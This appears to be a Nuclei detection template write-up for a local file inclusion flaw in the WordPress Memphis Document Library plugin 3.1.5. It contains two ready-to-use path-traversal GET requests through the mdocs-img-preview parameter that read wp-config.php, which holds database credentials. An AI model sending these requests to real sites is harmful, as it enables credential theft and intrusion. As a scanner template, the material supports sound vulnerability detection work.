# Nuclei Template: WordPress Memphis Document Library 3.1.5 - Local File Inclusion
**Template ID:** wp-memphis-documents-library-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`wp-memphis-documents-library-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Memphis Document Library 3.1.5 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
GET {{BaseURL}}/?mdocs-img-preview=../../../wp-config.php
```

## References
- https://www.exploit-db.com/exploits/39593
- https://wpscan.com/vulnerability/53999c06-05ca-44f1-b713-1e4d6b4a3f9f
